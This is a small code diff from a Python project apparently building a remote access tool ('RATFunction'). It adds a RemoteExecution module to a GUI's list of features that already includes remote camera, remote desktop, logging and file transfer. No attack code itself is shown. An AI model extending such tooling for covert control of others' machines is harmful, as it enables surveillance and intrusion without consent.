@@ -10,10 +10,11 @@ from RATFunction.Message import Message
 from RATFunction.RemoteCamera import RemoteCamera
 from RATFunction.RemoteDesktop import RemoteDesktop
 from RATFunction.MyLogging import MyLogging
+from RATFunction.RemoteExecution import RemoteExecution
 
 from RemoteSystemMode import RemoteSystemMode
 
-function_classes = [Message, RemoteDesktop, MyLogging, RemoteCamera, FileTransfer]
+function_classes = [Message, RemoteDesktop, MyLogging, RemoteCamera, FileTransfer, RemoteExecution]
 
 
 class SystemSelectionDialog(QWidget):
